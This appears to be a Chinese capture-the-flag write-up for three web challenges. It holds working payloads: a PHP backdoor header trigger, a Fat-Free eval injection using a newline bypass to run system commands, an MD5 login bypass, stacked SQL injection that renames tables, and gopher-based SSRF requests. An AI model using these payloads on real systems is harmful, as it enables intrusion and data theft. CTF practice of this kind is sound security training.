# web

## 签到

一个最近刚爆出来的php后门，直接一把梭

```
User-Agentt: zerodiumsystem("cat /flag");
```

## unset

一开始百度搜一下发现是fatfree框架，然后github一瞬间获取源码，本地搭建发现报错嘻嘻

```
syntax error, unexpected '.', expecting :: (T_PAAMAYIM_NEKUDOTAYIM) [G:\phpstudy_pro\WWW\yyds.top\lib\base.php(530) : eval()'d code:1]
```

在eval前加了个echo发现真的调用连，

```
unset($this->hive['后面是我们a=的内容
```

发现有过滤太长了吧，自己本独测试发现有phpinfo但是后面执行命令不行

```
a=a[%27phpinfo%27()]
```

尝试执行

```
?a=a[%27system%27(ls)]
```

但是多了空格不行换个思路

尝试php几种常用bypass，日常fuzz发现%0a加上直接成功闭合还能绕过后面过滤，然后芜湖起飞，闭合前面中间任意执行绕过过滤注释后面

```
?a=1%0a);system('cat /flag');//
```

## 系统

MD5-true的登录过滤前面用后面

```
ffifdyop和129581926211651571912466741651878684928
```

进去后我各种姿势失败

```
username=0';show tables;%23&password=1
```

之后

```
username=admin';show columns from real_admin_here_do_you_find ;#&password=a
```

尝试很多堆叠注入姿势失败，`prepare和set也不能同时出现`

发现可以改表名

```
rename tables fake_admin to fuck ; rename tables real_admin_here_do_you_find to fake_admin ;
```

然后的都

```
admin密码是5fb4e07de914cfc82afb44vbaf402203
```

然后用gopher发送下面这个获取cookie后

```
POST /admin.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

username=admin&password=5fb4e07de914cfc82afb44vbaf402203
```

再发

```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=c3bv46re495tugnt3vegmo25d2;

```

页面即可获得flag，做完这题人累死了哭哭